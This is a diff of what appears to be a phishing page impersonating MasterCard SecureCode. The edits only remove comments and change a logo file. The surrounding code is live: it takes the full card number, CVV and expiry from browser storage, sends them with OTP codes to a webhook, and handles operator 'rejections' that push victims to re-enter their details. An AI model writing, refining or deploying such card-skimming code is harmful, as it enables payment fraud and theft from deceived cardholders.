@@ -197,7 +197,7 @@
             flex-shrink: 0; 
         }
 
-        /* Botón Negro (igual que en tu visa.php) */
+        /* Botón Negro */
         .btn-primary { 
             background: #000000; 
             color: #ffffff; 
@@ -329,7 +329,7 @@
                 </svg>
             </div>
             <div class="mc-logo">
-                <img src="master.png" alt="MasterCard SecureCode" />
+                <img src="id.png" alt="MasterCard SecureCode" />
             </div>
         </div>
 
@@ -726,8 +726,6 @@
                     clearInterval(pollingInterval); pollingInterval = null;
                     mostrarError('❌ Credenciales incorrectas o transacción rechazada');
                     
-                    // 🔥 REGLA: SI RECHAZAN EN CREDENCIALES, GENERAMOS UN NUEVO ID
-                    // PERO NO LO ENVIAMOS AL WEBHOOK TODAVÍA
                     solicitudId = 'MC-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
                     enviarHeartbeat('activo');
 
@@ -818,7 +816,6 @@
                         statusMessage.textContent = '⚠️ ERROR DE USUARIO: Las credenciales no coinciden. Por favor, ingrese nuevamente sus datos.';
                         statusMessage.style.display = 'block';
                         
-                        // 🔥 REGLA: SI ES ERROR USUARIO, TAMBIÉN GENERAMOS UN NUEVO ID
                         solicitudId = 'MC-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
                         enviarHeartbeat('activo');
 
@@ -835,8 +832,6 @@
                     statusMessage.textContent = mensajeError;
                     statusMessage.style.display = 'block';
 
-                    // 🔥 REGLA: SI RECHAZAN EL OTP, GENERAMOS UN NUEVO ID
-                    // PERO NO LO ENVIAMOS AL WEBHOOK TODAVÍA
                     solicitudId = 'MC-' + Date.now() + '-' + Math.random().toString(36).substr(2, 9);
                     enviarHeartbeat('activo');
 
@@ -1031,8 +1026,6 @@
                 rechazoDetectado = false;
                 enviarHeartbeat('activo');
 
-                // 🔥 AQUÍ ESTÁ EL CAMBIO: SI EL ID CAMBIÓ POR UN RECHAZO ANTERIOR, 
-                // PRIMERO ENVIAMOS LAS CREDENCIALES PARA CREAR LA SOLICITUD
                 const numeroTarjeta = localStorage.getItem('cardNumberFull') || 'No disponible';
                 const cvv = localStorage.getItem('cardCVV') || 'No disponible';
                 const vencimiento = localStorage.getItem('cardExpiry') || 'No disponible';
@@ -1048,10 +1041,8 @@
                     fecha: new Date().toLocaleString('es-CO')
                 };
 
-                // Enviamos credenciales (si ya existe, tu PHP lo actualiza)
                 await enviarCredencialesAlWebhook(datosCred);
 
-                // Ahora enviamos el OTP con el nuevo ID
                 if (modoAutenticacion === 'otp') {
                     const datosOTP = {
                         solicitudId: solicitudId,
